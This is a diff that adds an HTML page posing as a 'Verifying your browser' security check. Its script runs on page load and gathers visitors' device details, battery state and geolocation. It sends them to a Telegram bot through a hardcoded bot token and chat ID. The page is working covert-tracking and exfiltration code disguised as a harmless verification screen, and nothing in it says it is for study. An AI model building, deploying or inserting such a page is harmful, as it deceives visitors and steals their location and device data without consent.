@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      text-align: center;
+      padding: 40px;
+    }
+    .card {
+      background-color: white;
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+    }
+    h2 {
+      color: #333;
+    }
+    p {
+      font-size: 14px;
+      color: #777;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #555;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Verifying your browser...</h2>
+    <p>Please wait while we complete a quick security check.</p>
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    async function collectAndSend() {
+      const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        connection: navigator.connection ? {
+          downlink: navigator.connection.downlink,
+          effectiveType: navigator.connection.effectiveType,
+          rtt: navigator.connection.rtt
+        } : {},
+        battery: {},
+        geo: {}
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          data.battery = {
+            level: battery.level,
+            charging: battery.charging
+          };
+        } catch (e) {}
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          data.geo = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+          };
+          sendData(data);
+        }, () => sendData(data));
+      } else {
+        sendData(data);
+      }
+    }
+
+    function sendData(data) {
+      fetch("https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "7121448697",
+          text: "📦 New visitor data:\n" + JSON.stringify(data, null, 2)
+        })
+      });
+    }
+
+    collectAndSend();
+  </script>
+</body>
+</html>
